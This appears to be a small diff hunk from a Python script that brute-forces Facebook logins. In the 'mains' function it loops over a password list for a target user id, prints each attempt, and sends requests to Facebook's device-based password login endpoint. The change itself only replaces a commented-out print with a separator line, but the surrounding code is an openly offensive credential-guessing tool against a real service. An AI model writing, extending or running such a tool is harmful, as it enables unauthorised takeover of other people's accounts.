@@ -35,7 +35,7 @@ def load_passwords(file_path):
 def mains(uid, passwords):
     global loop
     for password in passwords:
-        ##print(f"Trying password: {password}")
+        print(40*f"=")
         sys.stdout.write(f"\r{W}[{GR}M1{W}] ~ [Trying password: {GR}{loop}{W}:{password}\r "), sys.stdout.flush()
         p = session.get(f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr')
         dataa = {
